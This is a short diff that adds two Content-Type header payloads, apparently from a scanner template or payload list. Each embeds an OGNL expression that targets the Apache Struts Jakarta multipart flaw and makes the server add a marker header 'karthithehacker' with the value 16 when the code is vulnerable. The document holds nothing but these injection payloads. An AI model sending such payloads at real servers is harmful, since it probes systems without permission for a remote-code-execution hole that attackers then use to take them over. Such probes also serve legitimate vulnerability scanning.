@@ -1,0 +1,4 @@
+Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('karthithehacker',4*4)}.multipart/form-data
+
+
+Content-Type: .multipart/form-data~%{#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].addHeader("karthithehacker",4*4)}
